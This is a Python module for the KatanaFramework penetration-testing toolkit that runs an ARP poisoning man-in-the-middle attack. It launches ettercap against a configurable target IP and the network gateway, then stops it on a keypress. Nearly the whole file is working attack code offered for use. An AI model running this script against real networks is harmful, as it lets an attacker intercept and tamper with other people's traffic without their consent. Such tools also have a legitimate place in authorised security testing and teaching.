# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KATANAFRAMEWORK import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES  
from core.Function import get_gateway,isConect,Subprocess,checkDevice
import commands
# END LIBRARIES  

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="3.0"
	init.Description        ="ARP Poisoning"
	init.CodeName           ="net/at.arpsp"
	init.DateCreation       ="26/08/2015"      
	init.LastModification   ="03/06/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME    VALUE            RQ     DESCRIPTION
		'drive'  :["eth0"         ,True ,'Range Scan'],
		'target' :["192.168.1.223",True ,'Target IP'],
		'gateway':[get_gateway()  ,True ,'Gateway IP']
	}
	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):

	if isConect() and checkDevice(init.var['drive']):
		printAlert(0,"Starting ARP Poisoning...")
		Subprocess("ettercap -T -M ARP /"+init.var['target']+"// /"+init.var['gateway']+"// -i "+init.var['drive'])
		raw_input(printAlert(8,"Stop Attack ARP (PRESS ANY KEY)"))
		commands.getoutput("killall ettercap")	

# END CODE MODULE ############################################################################################
